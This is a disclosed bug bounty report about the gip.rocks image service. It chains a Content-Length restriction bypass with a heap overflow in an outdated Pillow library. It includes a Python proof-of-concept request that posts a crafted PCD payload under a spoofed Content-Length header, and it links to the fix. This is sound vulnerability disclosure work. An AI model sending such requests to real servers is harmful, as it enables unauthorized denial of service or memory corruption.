# Content-Length restriction bypass to heap overflow in gip.rocks.

## Report Details
- **Report ID**: 214449
- **URL**: https://hackerone.com/reports/214449
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-03-18T12:27:50.003Z
- **Disclosed**: 2017-03-20T20:17:36.903Z

## Reporter
- **Username**: edoverflow
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gratipay

## Vulnerability Information
I started playing around with a0xnirudh's [Content-Length restriction bypass](https://hackerone.com/reports/203388) and noticed that when combined with a different vulnerability  this could be leveraged to do a bit more than DoS.

We decided to open a new ticket to address this issue, since [we were already aware of the bypass](https://github.com/gratipay/gip.rocks/issues/2). a0xnirudh wrote such a good report that we decided to not close their report as a `Duplicate`.

# Summary
---

I noticed that `gip.rocks` was using an outdated version (2.9.0) of the Pillow framework which is vulnerable to heap overflows. The test playoad is 788480 bytes. So the bypass allowed me to pass the payload on to the vulnerable code.

~~~python
>>> import os
>>> os.path.getsize('payload.pcd')
788480L
~~~

# PoC
---

Vulnerable code in `www/v1.st` summarised:

~~~python
>>> from PIL import Image
>>> image = Image.open('foo.jpg')
>>> image.resize((foo, bar))
~~~

Summarised exploit:

~~~python
>>> from PIL import Image
>>> image = Image.open('payload.pcd')
>>> image.resize((128, 128))
~~~

Exploit concept:

~~~python
import requests
r = requests.post(  'http://gip.rocks/v1', 
                    data = open('payload.pcd').read(), 
                    headers = { 
                        'Content-Type': 'image/jpeg',
                        'Content-Length': ' ' # Insert a value smaller than 262144
                    }
                  )
print(r.status_code, r.reason)
~~~

# Fix
---

I have submitted a PR to solve the heap overflow vulnerability: https://github.com/gratipay/gip.rocks/pull/5

## Attachments
No attachments
